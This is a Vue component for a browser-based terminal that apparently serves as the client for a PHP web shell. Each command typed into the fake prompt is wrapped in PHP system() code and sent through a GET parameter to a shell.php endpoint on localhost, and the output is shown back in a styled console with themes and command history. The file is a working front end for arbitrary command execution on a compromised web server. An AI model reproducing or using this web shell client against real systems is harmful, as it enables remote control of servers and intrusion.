<template>
    <div class="content"
         ref="content"
         :style="fontSizeStyle"
         :themes="currentColor"
         @wheel="zoomFontSize">
        <div class="themes">
            <span>主题：</span>
            <div class="theme" v-for="item of themes" :style="{background:item.color}"
                 @click="currentColor = item.class"></div>
        </div>
        <div class="terminal" ref="terminal" :themes="currentColor">
            <div class="row" v-for="type of row">
                <div class="input-history">
                    <span class="path">{{type.path}}</span>
                    <span class="cmd">{{type.cmd}}</span>
                </div>
                <pre class="result">{{type.result}}</pre>
            </div>
            <div class="row">
                <div class="type-container">
                    <textarea class="type"
                              :style="fontSizeStyle"
                              :themes="currentColor"
                              @input="input($event,type)"
                              @keydown="keydown($event,type)"
                              v-model="type.input">
                    </textarea>
                    <span class="float-pwd" :themes="currentColor">{{type.path}}</span>
                </div>
            </div>
        </div>
    </div>
</template>

<script>

    export default {
        data() {
            return {
                fontSize: 18,
                path: 'D:\\safe\\hw\\2020_09_18',
                row: [],
                type: {},
                urlencode: [
                    {
                        k: '%',
                        v: '%25'
                    }, {
                        k: '&',
                        v: '%26'
                    },
                ],
                themes: [
                    {
                        class: 'green',
                        color: '#00FF00',
                    },
                    {
                        class: 'win',
                        color: '#cccccc',
                    },
                ],
                currentColor: 'green'
            }
        },
        created() {
            let search = location.search.substr(1).split('&')
            let param = search.reduce((p, c, i) => {
                let t = c.split('=')
                p[t[0]] = t[1]
                return p
            }, {})
            this.getPwd(param)
        },
        directives: {
            focus: {
                inserted: function (el) {
                    el.focus()
                }
            }
        },
        computed: {
            fontSizeStyle() {
                return {fontSize: this.fontSize + 'px'}
            }
        },
        methods: {
            zoomFontSize(e) {
                if (e.ctrlKey) {
                    let deltaY = e.deltaY
                    if (deltaY > 0) {
                        this.fontSize--
                        if (this.fontSize < 12) {
                            this.fontSize = 12
                        }
                    } else {
                        this.fontSize++
                    }
                    e.stopPropagation();
                    e.preventDefault()
                }
            },
            getPwd() {
                let that = this
                let cmd = 'echo %25cd%25'
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        console.log(JSON.stringify(res));
                        res = res.replace('\r\n', '')
                        console.log(JSON.stringify(res));
                        that.path = res
                        that.type = {
                            path: that.path + '>',
                            input: that.path + '>',
                            id: '',
                        }
                    }
                })
            },
            exec(event, cmd) {
                console.log(cmd === 'cls');
                if (cmd === '') return
                if (cmd === 'cls' || cmd === 'clear') {
                    this.row = []
                    this.type.input = this.type.path
                    this.type.id = ''
                    return
                }
                let that = this
                let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        that.row.push({
                            cmd: cmd,
                            historyInput: that.type.input,
                            path: that.type.path,
                            result: res,
                        })
                        that.type.input = that.type.path
                        // that.$console(that.row)

                        that.$nextTick(() => {
                            that.$refs.content.scrollTop = that.$refs.terminal.scrollHeight;
                        })
                    }
                })
            },
            cmdAutoComplete(type, cmd) {
                switch (cmd) {
                    case 'cls':
                        this.row = []
                        this.row.push({
                            tmpPwd: this.pwd + '>',
                            pwd: this.pwd + '>',
                            history: '',
                            result: '',
                        })
                        break;
                }

            },
            keydown(event, type) {
                // console.log(event.keyCode);

                let cmd = type.input.substr(type.path.length, type.input.length)
                if (event.keyCode === 13) {
                    event.returnValue = false;
                    this.exec(event, cmd)
                }
                //tab键
                if (event.keyCode === 9) {
                    console.log('tab键');
                    this.cmdAutoComplete(type, cmd)
                    event.returnValue = false;
                }
                //上键
                if (event.keyCode === 38) {
                    this.$console(this.row)
                    if (this.type.id !== '') {
                        if (this.type.id !== 0) {
                            this.type.id = this.type.id - 1
                            this.type.input = this.row[this.type.id].history
                        } else {
                            this.type.input = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    } else {
                        if (this.row.length) {
                            this.type.input = this.row[this.row.length - 1].history
                            this.type.id = this.row.length - 1
                        }
                    }
                    console.log(this.type.id);
                    return
                }
                //下键
                if (event.keyCode === 40) {
                    console.log(JSON.stringify(this.row, null, 4))
                    console.log(this.type.id);
                    if (this.type.id !== '') {
                        if (this.type.id !== this.row.length - 1) {
                            this.type.id = this.type.id + 1
                            this.type.input = this.row[this.type.id].history
                        } else {
                            this.type.id = 0
                            this.type.input = this.row[this.type.id].history
                        }
                    }
                    return
                }
                //删除键
                if (event.keyCode === 8) {
                    if (type.input === type.path) {
                        event.returnValue = false;
                    }
                }
            },
            input(event, type) {
                let textArea = event.target;
                if (textArea.scrollHeight > 195) {
                    textArea.style.height = textArea.scrollHeight + 'px'
                }
                if (event.target.value === '') {
                    type.input = type.path
                }
                if (type.input.length < type.path.length) {
                    type.input = type.path
                }
                if (type.input.substr(0, type.path.length) !== type.path) {
                    type.input = type.path
                }
            },
        }
    }
</script>

<style lang="scss" scoped>
    @import "../../assets/scss/color";

    $font-color: rgb(0, 255, 0);

    .content {
        overflow: auto;
        height: 100%;

        &[themes=green] {
            color: #00FF00;
            background: $bg-color;
        }

        &[themes=win] {
            color: #CCCCCC;
            background: #47494A;
        }

        .themes {
            display: flex;

            .theme {
                margin: 1px;
                width: 20px;
                height: 20px;
                border-radius: 2px;
            }
        }


        .terminal {
            font-family: "Microsoft YaHei UI";

            .row {
                margin-bottom: 20px;

                .type-container {
                    position: relative;

                    .float-pwd {
                        position: absolute;
                        /*left: 0px;*/
                        left: -1px;
                        top: 0;
                        color: #CCCCCC;


                        &[themes=green] {
                            background: $bg-color;
                        }

                        &[themes=win] {
                            background: #47494A;
                        }
                    }

                    textarea {
                        resize: none;
                        font-family: "Microsoft YaHei UI";
                        height: 200px;
                        text-align: start;
                        //width: 100px;
                        width: 100%;
                        padding: 0;
                        margin: 0;
                        box-sizing: border-box;
                        border: 0;
                        outline: 0;
                        background: $bg-color;

                        &[themes=green] {
                            color: #00FF00;
                            background: $bg-color;
                        }

                        &[themes=win] {
                            color: #CCCCCC;
                            background: #47494A;
                        }
                    }
                }

                .input-history {
                    word-break: break-all;

                    .path {
                        // color: rgb(131,148,150);
                        color: #CCCCCC;
                    }
                }

                .result {
                    font-family: "Microsoft YaHei UI";
                    margin: 0;
                }
            }
        }

    }

</style>
